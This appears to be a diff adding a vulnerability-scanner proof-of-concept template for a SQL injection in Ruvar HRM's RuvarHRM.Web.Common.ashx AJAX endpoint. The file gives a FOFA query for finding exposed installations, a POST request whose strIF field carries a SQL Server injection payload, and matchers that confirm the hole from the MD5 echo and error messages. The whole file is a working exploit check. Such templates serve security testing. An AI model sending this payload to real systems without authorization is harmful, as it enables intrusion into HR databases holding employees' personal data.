@@ -1,0 +1,22 @@
+id: poc-yaml-ruvar-hrm-ruvarhrm-web-common-ashx-sqli
+info:
+  name: Ruvar HRM RuvarHRM.Web.Common.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar_hrm
+  fofa: body="RuvarHRM/web_login/login.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx
+  headers:
+    Content-Type: application/json
+    X-Ajaxpro-Method: SearchUsers
+  data: '{"strIF":"1=1) and 1=sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))--","deptPv":"0","strUserType":"all"}'
+  expression: "status_code == 200 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    System.Data.SqlClient.SqlException\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\n\
+    matches(body,\"在将(.*?)值\")\n"
+transport: http
